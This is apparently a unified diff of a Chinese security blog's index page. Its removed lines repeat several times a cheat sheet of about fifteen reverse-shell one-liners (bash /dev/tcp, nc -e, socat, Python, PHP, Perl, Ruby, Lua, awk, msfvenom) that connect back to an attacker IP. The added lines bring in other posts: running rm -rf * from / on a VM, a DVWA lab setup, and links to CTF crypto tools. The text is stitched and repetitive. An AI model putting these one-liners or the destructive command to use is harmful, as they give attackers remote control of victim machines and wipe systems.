-<p>接收端:./socat udp-listen:端口 - 发送端:socat udp-connect:ip:port exec:’bash -i’,pty,stderr,sane 2&gt;&amp;1&gt;/dev/null &amp;</p>
-<blockquote>
-<p>6.python反弹</p>
-</blockquote>
-<p>接收端(攻击机,外网)：nc -lvvp 端口 发送端(靶机)：python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“接收端ip”,接收端端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
-<blockquote>
-<p>7.PHP反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端：php -r ‘$sock=fsockopen(“接收端ip”,接收端端口);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
-<blockquote>
-<p>8.JAVA反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端： r = Runtime.getRuntime() p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[]) p.waitFor()</p>
-<blockquote>
-<p>9.perl反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端： perl -e ‘use Socket;$i=”ip”;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
-<blockquote>
-<p>10.ruby反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端： ruby -r socket -e ‘exit if fork;c=TCPSocket.new(“ip”,”port”);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’</p>
-<blockquote>
-<p>11.telnet反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端： mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</p>
-<blockquote>
-<p>12.lua反弹(安装lua环境：apt-get install lua*)</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端：lua -e “local s=require(‘socket’);local t=assert(s.tcp());t:connect(‘ip’,port);while true do local r,x=t:receive();local f=assert(io.popen(r,’r’));local b=assert(f:read(‘*a’));t:send(b);end;f:close();t:close();”</p>
-<blockquote>
-<p>13.awk反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端：awk ‘BEGIN{s=”/inet/tcp/0/ip/port”;while(1){do{s|&amp;getline c;if(c){while((c|&amp;getline)&gt;0)print $0|&s;close(c)}}while(c!=”exit”);close(s)}}’</p>
-<blockquote>
-<p>14.ksh反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端：ksh -c ‘ksh &gt;/dev/tcp/ip/port 2&gt;&amp;1 &lt;&amp;1’</p>
-<blockquote>
-<p>15.msfvenom生成各种payload</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 查找payload：msfvenom -l payload |grep ‘cmd/unix/reverse’ 生成payload：msfvenom -p cmd/unix/reverse_模块 lhost=接收端ip lport=接收端端口 R</p>
+        <p>装了个Ubuntu server 14.04虚拟机，本来想搭fbctf，但是苦于没梯子… 看着它6个多G的大小，终于下定决心，删之 一直听说恐怖的rm -rf *大法，于是我就决定在这台肥的虚拟机上试验一下 cd到/，输入rm -rf *，回车 瞬间跳出大量不可删除的信息 <img src="http://112.74.49.123/wp-content/uploads/2017/10/rm.jpg" alt=""> 略过这难熬的一分钟 删除完之后命令行界面依然存在，但是很多基础的命令都被删了，连ls命令都不能使用，不过好在pwd和cd可用，删除之后目录结构也特别单调 附一张删除之后的gif <img src="http://112.74.49.123/wp-content/uploads/2017/10/rm.gif" alt=""> Ubuntu server os：我感觉我已经是台废服务器了</p>
 
       
 
@@ -907,6 +282,10 @@
         		<li class="article-tag-list-item">
         			<a href="/categories/linux//" class="article-tag-list-link color1">linux</a>
         		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/linux/linux通用//" class="article-tag-list-link color3">linux通用</a>
+        		</li>
       		
 		</ul>
 	</div>
@@ -914,7 +293,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/16/linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/10/20/e5-9c-a8linux-e7-9a-84-ef-bc-88-e6-a0-b9-ef-bc-89-e7-9b-ae-e5-bd-95-e4-b8-8b-e6-89-a7-e8-a1-8crm-rf-e7-9a-84-e6-84-89-e5-bf-ab-e7-bb-8f-e5-8e-86/">展开全文 >></a>
         </p>
       
 
@@ -944,98 +323,27 @@
 
 
   
-    <article id="post-linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-centos-e6-90-ad-e5-bb-badvwa-e5-ae-9e-e9-aa-8c-e5-b9-b3-e5-8f-b0" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/16/linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95-1/">linux反弹shell总结(15种方法)</a>
+      <a class="article-title" href="/2017/10/19/centos-e6-90-ad-e5-bb-badvwa-e5-ae-9e-e9-aa-8c-e5-b9-b3-e5-8f-b0/">Centos搭建DVWA实验平台</a>
     </h1>
   
 
         
-        <a href="/2018/11/16/linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95-1/" class="archive-article-date">
-  	<time datetime="2018-11-16T04:52:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-16</time>
+        <a href="/2017/10/19/centos-e6-90-ad-e5-bb-badvwa-e5-ae-9e-e9-aa-8c-e5-b9-b3-e5-8f-b0/" class="archive-article-date">
+  	<time datetime="2017-10-19T11:30:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-19</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>1.1发送文件(公网发内网)</p>
-</blockquote>
-<p>文件发送端：nc -lp 6666 &lt; 文件 文件接收端：nc 发送端ip 发送端端口 &gt; 新文件</p>
-<blockquote>
-<p>1.2发送文件(内网发公网)</p>
-</blockquote>
-<p>文件发送端：nc -lp 6666 &gt; 文件 文件接收端：nc 发送端ip 发送端端口 &lt; 新文件</p>
-<blockquote>
-<p>2.聊天</p>
-</blockquote>
-<p>发送端：nc -lp 6666 接收端：nc 发送端ip 发送端端口</p>
-<blockquote>
-<p>3.1发送shell</p>
-</blockquote>
-<p>发送端(公网服务器)：nc -lvvp 6666 -e /bin/bash 2&gt;&amp;1&gt;/dev/null &amp; 接收端：nc 发送端ip 发送端端口</p>
-<blockquote>
-<p>3.2反弹shell</p>
-</blockquote>
-<p>接收端：nc -lvvp 6666 发送端(内网网服务器)：nc 接收端ip 接收端端口 -e /bin/bash 2&gt;&amp;1&gt;/dev/null &amp;</p>
-<blockquote>
-<p>4.bash反弹</p>
-</blockquote>
-<p>接收端(hackip,公网)：nc -lvvp 端口 发送端(受害者)：bash -i &gt;&amp; /dev/tcp/hackip/hack端口 0&gt;&amp;1 发送端(受害者)：0&lt;&amp;31-;exec 31&lt;&gt;/dev/tcp/hackip/hack端口;sh &lt;&amp;31 &gt;&amp;31 2&gt;&amp;31</p>
-<blockquote>
-<p>5.1socat反弹(tcp)</p>
-</blockquote>
-<p>接收端(攻击机)：./socat TCP-LISTEN:端口 - 发送端(靶机)：./socat exec:’bash -i’,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口</p>
-<blockquote>
-<p>5.2socat反弹(udp)</p>
-</blockquote>
-<p>接收端:./socat udp-listen:端口 - 发送端:socat udp-connect:ip:port exec:’bash -i’,pty,stderr,sane 2&gt;&amp;1&gt;/dev/null &amp;</p>
-<blockquote>
-<p>6.python反弹</p>
-</blockquote>
-<p>接收端(攻击机,外网)：nc -lvvp 端口 发送端(靶机)：python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“接收端ip”,接收端端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
-<blockquote>
-<p>7.PHP反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端：php -r ‘$sock=fsockopen(“接收端ip”,接收端端口);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
-<blockquote>
-<p>8.JAVA反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端： r = Runtime.getRuntime() p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[]) p.waitFor()</p>
-<blockquote>
-<p>9.perl反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端： perl -e ‘use Socket;$i=”ip”;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
-<blockquote>
-<p>10.ruby反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端： ruby -r socket -e ‘exit if fork;c=TCPSocket.new(“ip”,”port”);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’</p>
-<blockquote>
-<p>11.telnet反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端： mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</p>
-<blockquote>
-<p>12.lua反弹(安装lua环境：apt-get install lua*)</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端：lua -e “local s=require(‘socket’);local t=assert(s.tcp());t:connect(‘ip’,port);while true do local r,x=t:receive();local f=assert(io.popen(r,’r’));local b=assert(f:read(‘*a’));t:send(b);end;f:close();t:close();”</p>
-<blockquote>
-<p>13.awk反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端：awk ‘BEGIN{s=”/inet/tcp/0/ip/port”;while(1){do{s|&amp;getline c;if(c){while((c|&amp;getline)&gt;0)print $0|&s;close(c)}}while(c!=”exit”);close(s)}}’</p>
-<blockquote>
-<p>14.ksh反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端：ksh -c ‘ksh &gt;/dev/tcp/ip/port 2&gt;&amp;1 &lt;&amp;1’</p>
-<blockquote>
-<p>15.msfvenom生成各种payload</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 查找payload：msfvenom -l payload |grep ‘cmd/unix/reverse’ 生成payload：msfvenom -p cmd/unix/reverse_模块 lhost=接收端ip lport=接收端端口 R</p>
+        <p>1.安装虚拟机 这个就不多说了，安装一个centos7最小模式就行 然后配置ssh yum install openssh* vi /etc/ssh/sshd_config 把下面两行取消注释 PermitEmptyPasswords no PasswordAuthentication yes 这里我们就不限制root用户登录ssh了 确保这个是 PermitRootLogin yes 就是确保我们可以用root登录ssh 重启ssh systemctl restart sshd.service 设置开机启动 systemctl enable sshd.service 添加防火墙策略 firewall-cmd –permanent –zone=public –add-service=ssh firewall-cmd –reload 2.配置网卡（不然没法上网） 首先我们进入这个配置文件目录 cd /etc/sysconfig/network-scripts 一般是在这个目录下有个叫 ifcfg-enp0s3 这样一个文件，没有的话找找其他的相似的文件 然后我们打开它 vi ifcfg-enp0s3 这个时候我们还没有vim的，所以只好用vi这个简版的 然后将 ONBOOT=no 改为 ONBOOT=yes 保存后重启网卡： service network restart 此时就可以上网了 3.各种前期准备工作（参考） 我们先更新一下cache yum makecache 升级一下 yum update 然后安装一下vim yum install vim 安装ifconfig yum install net-tools 这里生不升级看你，安不安vim也看你，没vim编辑配置文件很麻烦我感觉 4.安装必要组件 我们先安装Apache的服务器 yum install httpd 然后启动Apache service httpd start 然后看一下Apache的状态 service httpd status 然后设置httpd在运行级别为2、3、4、5的情况下都是on（开启）的状态 chkconfig –level 2345 httpd on firewall-cmd –permanent –zone=public –add-service=http 安装MySQL，mysql在centos的源中是没有的，只有mariadb，一样 你想自己官网下，然后编译安装也可以，这里我就用mysql的分之兼容产品mariadb了 [root@localhost ~]# yum search mariadb Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile * base: centos.ustc.edu.cn * extras: centos.ustc.edu.cn * updates: centos.ustc.edu.cn ==================================================================================== N/S matched: mariadb ==================================================================================== mariadb-bench.x86_64 : MariaDB benchmark scripts and data mariadb-devel.i686 : Files for development of MariaDB/MySQL applications mariadb-devel.x86_64 : Files for development of MariaDB/MySQL applications mariadb-embedded.i686 : MariaDB as an embeddable library mariadb-embedded.x86_64 : MariaDB as an embeddable library mariadb-embedded-devel.i686 : Development files for MariaDB as an embeddable library mariadb-embedded-devel.x86_64 : Development files for MariaDB as an embeddable library mariadb-libs.i686 : The shared libraries required for MariaDB/MySQL clients mariadb-libs.x86_64 : The shared libraries required for MariaDB/MySQL clients mariadb-server.x86_64 : The MariaDB server and related files mariadb.x86_64 : A community developed branch of MySQL mariadb-test.x86_64 : The test suite distributed with MariaD Name and summary matches only, use “search all” for everything. [root@localhost ~]# 我们安装这几个包就可以了 yum install mariadb.x86_64 mariadb-server.x86_64 mariadb-libs.x86_64 mariadb-devel.x86_64 启动mysql service mariadb start chkconfig –level 2345 mariadb on 然后设置mariadb的初始密码 mysqladmin -u root -p password 然后就可以登录了 mysql -uroot -p 创建一个数据库 create database dvwa; quit; 然后我们安装PHP yum install php.x86_64 php-mysql.x86_64 php-pear php-pear-DB php-gd 然后我们下载DVWA的包，先安装一个wget yum install wget wget <a href="https://github.com/ethicalhack3r/DVWA/archive/v1.9.tar.gz" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA/archive/v1.9.tar.gz</a> cp v1.9.tar.gz /var/www/html/ cd /var/www/html tar zxvf v1.9.tar.gz mv DVWA-1.9 dvwa 然后我们用另一台机器的浏览器访问虚拟机的ip（这个时候确保机器网络设置为桥接，然后重启，然后再用ifconfig查看你虚拟机的ip，然后访问） <a href="http://x.x.x.x/dvwa/setup.php" target="_blank" rel="noopener">http://x.x.x.x/dvwa/setup.php</a> 然后根据红色那些提示，设置环境 一般就是这样的 vim /etc/php.ini 将这几个设置成这样的 allow_url_fopen = On allow_url_include = On 进入/var/www/html/dvwa/config目录下 先备份配置文件 cp config.inc.php config.inc.php.bak 改这么几个地方 vim config.inc.php $_DVWA[ ‘db_server’ ] = ‘localhost’; $_DVWA[ ‘db_password’ ] = ‘youmysqlpassword’; $_DVWA[ ‘recaptcha_public_key’ ] = ‘’; $_DVWA[ ‘recaptcha_private_key’ ] = ‘’; 然后下面这个赋权可写 /var/www/html/dvwa/hackable/uploads cd /var/www/html/dvwa/hackable/ chmod 777 uploads /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt cd /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp chmod 777 phpids_log.txt ok 然后我们点一下Create/Reset那个按钮 然后就会自动跳到登录界面 默认的登录密码是 admin password</p>
 
       
 
@@ -1050,7 +358,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/linux//" class="article-tag-list-link color1">linux</a>
+        			<a href="/categories/centos//" class="article-tag-list-link color2">centos</a>
         		</li>
       		
 		</ul>
@@ -1059,7 +367,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/16/linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95-1/">展开全文 >></a>
+          <a class="article-more-a" href="/2017/10/19/centos-e6-90-ad-e5-bb-badvwa-e5-ae-9e-e9-aa-8c-e5-b9-b3-e5-8f-b0/">展开全文 >></a>
         </p>
       
 
@@ -1089,98 +397,409 @@
 
 
   
-    <article id="post-linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-e5-b8-b8-e8-a7-81-e5-8f-a4-e5-85-b8-e5-af-86-e7-a0-81-e5-8f-8a-e5-9c-a8-e7-ba-bf-e5-b7-a5-e5-85-b7" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/16/linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95-2/">linux反弹shell总结(15种方法)</a>
+      <a class="article-title" href="/2017/10/19/e5-b8-b8-e8-a7-81-e5-8f-a4-e5-85-b8-e5-af-86-e7-a0-81-e5-8f-8a-e5-9c-a8-e7-ba-bf-e5-b7-a5-e5-85-b7/">常见古典密码及在线工具</a>
     </h1>
   
 
         
-        <a href="/2018/11/16/linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95-2/" class="archive-article-date">
-  	<time datetime="2018-11-16T04:52:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-16</time>
+        <a href="/2017/10/19/e5-b8-b8-e8-a7-81-e5-8f-a4-e5-85-b8-e5-af-86-e7-a0-81-e5-8f-8a-e5-9c-a8-e7-ba-bf-e5-b7-a5-e5-85-b7/" class="archive-article-date">
+  	<time datetime="2017-10-19T11:28:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-19</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>1.1发送文件(公网发内网)</p>
-</blockquote>
-<p>文件发送端：nc -lp 6666 &lt; 文件 文件接收端：nc 发送端ip 发送端端口 &gt; 新文件</p>
+        <ul>
+<li><strong>加密解密</strong><ul>
+<li><a href="http://jiema.wwei.cn/" target="_blank" rel="noopener">二维码解码</a></li>
+<li><a href="http://www.wwei.cn/" target="_blank" rel="noopener">二维码编码</a></li>
+<li><a href="http://www1.tc711.com/tool/BASE64.htm" target="_blank" rel="noopener">Base64编码/解码</a></li>
+<li><a href="http://pbaseconverter.com/" target="_blank" rel="noopener">Base32/Base16</a></li>
+<li><a href="http://tool.oschina.net/encode?type=4" target="_blank" rel="noopener">URL解码</a></li>
+<li><a href="http://www.cmd5.com/" target="_blank" rel="noopener">MD5查询</a></li>
+<li><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">摩尔斯电码</a></li>
+<li><a href="http://www.5ixuexiwang.com/str/" target="_blank" rel="noopener">字符串处理</a></li>
+<li><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a></li>
+<li><a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php" target="_blank" rel="noopener">将文本加密为各种语言</a></li>
+<li><a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="noopener">UU编码</a>(邮件编码的一种)</li>
+<li><a href="http://dogmamix.com/MimeHeadersDecoder/" target="_blank" rel="noopener">MIME标准</a>(邮件编码的一种)</li>
+<li><a href="http://encoders-decoders.online-domain-tools.com/" target="_blank" rel="noopener">Binhex编码</a>(邮件编码的一种,常见于MAC机)</li>
+<li><a href="http://tomeko.net/online_tools" target="_blank" rel="noopener">在线工具集合</a></li>
+<li><a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/" target="_blank" rel="noopener">栅栏密码</a></li>
+<li><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">serpent加密解密</a></li>
+<li><a href="http://planetcalc.com/1434/" target="_blank" rel="noopener">凯撒密码</a></li>
+<li><a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="noopener">ROT5/13/18/47</a></li>
+<li><a href="https://tool.lu/js/" target="_blank" rel="noopener">js代码在线加密解密</a></li>
+<li><a href="http://quipqiup.com/index.php" target="_blank" rel="noopener">词频在线分析</a></li>
+</ul>
+</li>
+<li><strong>图像分析</strong><ul>
+<li><a href="http://www.360doc.com/content/13/0314/18/699582_271506280.shtml" target="_blank" rel="noopener">GIF逐帧分解</a></li>
+</ul>
+</li>
+</ul>
 <blockquote>
-<p>1.2发送文件(内网发公网)</p>
+<p>本地工具</p>
 </blockquote>
-<p>文件发送端：nc -lp 6666 &gt; 文件 文件接收端：nc 发送端ip 发送端端口 &lt; 新文件</p>
+<ul>
+<li><strong>信隐术</strong><ul>
+<li><a href="https://pan.baidu.com/s/1jIdMWIi" target="_blank" rel="noopener">Stegsolve</a> (图像通道分析工具)</li>
+<li><a href="http://pan.baidu.com/s/1i54jWOl" target="_blank" rel="noopener">PngCheck</a> (png图像区块分析工具)</li>
+<li><a href="http://pan.baidu.com/s/1mhHzTji" target="_blank" rel="noopener">OutGuess隐写工具</a> (图像隐写工具OutGuess)</li>
+<li><a href="http://pan.baidu.com/s/1jIpZNj4" target="_blank" rel="noopener">JHide隐写工具</a> (JHide图片隐写工具)</li>
+<li><a href="http://pan.baidu.com/s/1nvB8zDB" target="_blank" rel="noopener">PDF隐写工具</a> (PDF隐写工具)</li>
+<li><a href="https://pan.baidu.com/s/1slUwxhN" target="_blank" rel="noopener">WaveEditor</a> (音频波形编辑工具)</li>
+<li><a href="http://pan.baidu.com/s/1pLQxthD" target="_blank" rel="noopener">Sonicvisualiser</a> (音频频谱分析工具)</li>
+</ul>
+</li>
+<li><strong>反编译</strong><ul>
+<li><a href="http://pan.baidu.com/s/1nuHY7Bb" target="_blank" rel="noopener">IDAQ</a> (反编译工具)</li>
+</ul>
+</li>
+<li><strong>破解</strong><ul>
+<li><a href="http://pan.baidu.com/s/1mi8Nwdq" target="_blank" rel="noopener">ARPR</a> (压缩文件破解工具)</li>
+<li><a href="http://pan.baidu.com/s/1b0Knj4" target="_blank" rel="noopener">Base64编码解码器</a>(Base64编码解码器)</li>
+<li><a href="http://pan.baidu.com/s/1c1NIHFU" target="_blank" rel="noopener">F5算法(隐写)</a></li>
+</ul>
+</li>
+</ul>
 <blockquote>
-<p>2.聊天</p>
+<p>文件</p>
 </blockquote>
-<p>发送端：nc -lp 6666 接收端：nc 发送端ip 发送端端口</p>
+<ul>
+<li><a href="http://www.cnblogs.com/qfcndtt/archive/2012/05/08/2489761.html" target="_blank" rel="noopener">文件头</a></li>
+</ul>
 <blockquote>
-<p>3.1发送shell</p>
+<p>编码</p>
 </blockquote>
-<p>发送端(公网服务器)：nc -lvvp 6666 -e /bin/bash 2&gt;&amp;1&gt;/dev/null &amp; 接收端：nc 发送端ip 发送端端口</p>
+<ul>
+<li><a href="http://tool.oschina.net/commons?type=4" target="_blank" rel="noopener">ASCII</a></li>
+<li><a href="http://baike.baidu.com/link?url=EAHhU36dVREhqMHIQKTIntQR54YUck5k4fk75JGGjyNwB1nBMryoYzbQrzB7mc6y" target="_blank" rel="noopener">摩尔斯电码</a></li>
+<li><a href="http://baike.baidu.com/view/2238848.htm" target="_blank" rel="noopener">培根密码</a></li>
+</ul>
 <blockquote>
-<p>3.2反弹shell</p>
+<p>API</p>
 </blockquote>
-<p>接收端：nc -lvvp 6666 发送端(内网网服务器)：nc 接收端ip 接收端端口 -e /bin/bash 2&gt;&amp;1&gt;/dev/null &amp;</p>
-<blockquote>
-<p>4.bash反弹</p>
-</blockquote>
-<p>接收端(hackip,公网)：nc -lvvp 端口 发送端(受害者)：bash -i &gt;&amp; /dev/tcp/hackip/hack端口 0&gt;&amp;1 发送端(受害者)：0&lt;&amp;31-;exec 31&lt;&gt;/dev/tcp/hackip/hack端口;sh &lt;&amp;31 &gt;&amp;31 2&gt;&amp;31</p>
-<blockquote>
-<p>5.1socat反弹(tcp)</p>
-</blockquote>
-<p>接收端(攻击机)：./socat TCP-LISTEN:端口 - 发送端(靶机)：./socat exec:’bash -i’,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口</p>
-<blockquote>
-<p>5.2socat反弹(udp)</p>
-</blockquote>
-<p>接收端:./socat udp-listen:端口 - 发送端:socat udp-connect:ip:port exec:’bash -i’,pty,stderr,sane 2&gt;&amp;1&gt;/dev/null &amp;</p>
-<blockquote>
-<p>6.python反弹</p>
-</blockquote>
-<p>接收端(攻击机,外网)：nc -lvvp 端口 发送端(靶机)：python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“接收端ip”,接收端端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
-<blockquote>
-<p>7.PHP反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端：php -r ‘$sock=fsockopen(“接收端ip”,接收端端口);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
-<blockquote>
-<p>8.JAVA反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端： r = Runtime.getRuntime() p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[]) p.waitFor()</p>
-<blockquote>
-<p>9.perl反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端： perl -e ‘use Socket;$i=”ip”;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
-<blockquote>
-<p>10.ruby反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端： ruby -r socket -e ‘exit if fork;c=TCPSocket.new(“ip”,”port”);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’</p>
-<blockquote>
-<p>11.telnet反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端： mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</p>
-<blockquote>
-<p>12.lua反弹(安装lua环境：apt-get install lua*)</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端：lua -e “local s=require(‘socket’);local t=assert(s.tcp());t:connect(‘ip’,port);while true do local r,x=t:receive();local f=assert(io.popen(r,’r’));local b=assert(f:read(‘*a’));t:send(b);end;f:close();t:close();”</p>
-<blockquote>
-<p>13.awk反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端：awk ‘BEGIN{s=”/inet/tcp/0/ip/port”;while(1){do{s|&amp;getline c;if(c){while((c|&amp;getline)&gt;0)print $0|&s;close(c)}}while(c!=”exit”);close(s)}}’</p>
-<blockquote>
-<p>14.ksh反弹</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 发送端：ksh -c ‘ksh &gt;/dev/tcp/ip/port 2&gt;&amp;1 &lt;&amp;1’</p>
-<blockquote>
-<p>15.msfvenom生成各种payload</p>
-</blockquote>
-<p>接收端：nc -lvvp 端口 查找payload：msfvenom -l payload |grep ‘cmd/unix/reverse’ 生成payload：msfvenom -p cmd/unix/reverse_模块 lhost=接收端ip lport=接收端端口 R</p>
+<ul>
+<li><a href="http://php.net/docs.php" target="_blank" rel="noopener">PHP API</a></li>
+</ul>
+<p>工具集： <a href="https://www.ctftools.com/down/down/passwd/" target="_blank" rel="noopener">密码机器</a>（强烈推荐） 包含了：栅栏密码 ，凯撒密码，维吉尼亚密码，摩斯电码，MD5 ，置换密码，替代密码 等。 常见密码： <a href="http://base64.xpcha.com/" target="_blank" rel="noopener">base64</a> <a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">ascii与十六进制、十进制、二进制转换</a> <a href="https://www.convertstring.com/zh_CN/EncodeDecode/UrlDecode" target="_blank" rel="noopener">url解密</a> 编码： JavaScript之jsfuck： <a href="http://www.jsfuck.com/" target="_blank" rel="noopener">在线解码</a> 或 在浏览器F12的调试器中执行 <a href="http://esoteric.sange.fi/brainfuck/impl/interp/i.html" target="_blank" rel="noopener">brainfuck</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/CTF密码//" class="article-tag-list-link color1">CTF密码</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/CTF密码/古典密码//" class="article-tag-list-link color5">古典密码</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/CTF密码/古典密码/密码学//" class="article-tag-list-link color4">密码学</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
